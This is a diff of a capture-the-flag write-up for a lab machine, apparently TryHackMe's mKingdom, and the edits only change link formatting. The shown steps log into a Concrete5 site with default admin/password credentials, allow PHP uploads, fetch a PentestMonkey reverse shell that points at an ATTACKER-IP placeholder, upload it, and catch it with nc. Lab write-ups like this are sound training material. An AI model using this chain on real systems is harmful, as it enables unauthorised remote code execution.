@@ -37,13 +37,15 @@ $ whatweb http://mkingdom.thm:85/app/castle/
 http://mkingdom.thm:85/app/castle/ [200 OK] Apache[2.4.7], Bootstrap, Concrete5[8.5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.10.107.31], JQuery, MetaGenerator[concrete5 - 8.5.2], PHP[5.5.9-1ubuntu4.29], Script[text/javascript], Title[Home :: toad], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.5.9-1ubuntu4.29], X-UA-Compatible[IE=edge]
 ```
 # Exploitation
-Successful [login](http://mkingdom.thm:85/app/castle/index.php/login) with **common credentials** `admin` and `password`. Navigate to [System & Settings > Allowed File Types](http://mkingdom.thm:85/app/castle/index.php/dashboard/system/files/filetypes) and whitelist `php` file extension for uploads.
+Successful login at `/app/castle/index.php/login` with **common credentials** `admin` and `password`.
+
+Then, navigate to **System & Settings > Allowed File Types** and whitelist `php` file extension for uploads.
 
 Download PHP reverse shell file as `rev.php`:
 ```bash
 curl -s -o rev.php 'https://www.revshells.com/PHP%20PentestMonkey?ip=<ATTACKER-IP>&port=<PORT>&shell=bash'
 ```
-Upload `rev.php` at [Files > File Manager](http://mkingdom.thm:85/app/castle/index.php/dashboard/files/search) and wait for connections:
+Upload `rev.php` at **Files > File Manager** and wait for connections:
 ```bash
 nc -lvnp <PORT>
 ```
